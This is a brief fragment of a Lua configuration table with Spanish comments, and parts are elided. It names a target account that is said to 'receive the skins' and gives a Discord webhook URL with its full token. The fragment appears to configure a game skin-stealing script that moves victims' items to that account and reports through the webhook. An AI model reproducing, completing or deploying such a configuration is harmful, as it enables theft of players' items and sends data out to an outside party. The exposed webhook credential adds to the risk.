local CONFIG = {
    ...
    TARGET_NAME   = "5skvz", -- username de la cuenta que recibe las skins
    ...
    WEBHOOK = {
        URL  = "https://discord.com/api/webhooks/1550250408625180682/hcn1hRjR0okDB_MKrzI1DAubVuaLUX4ln5m16X34gnm6tHpuH6i5EMdKXmSneULCtSg_", -- "" webhook de Discord
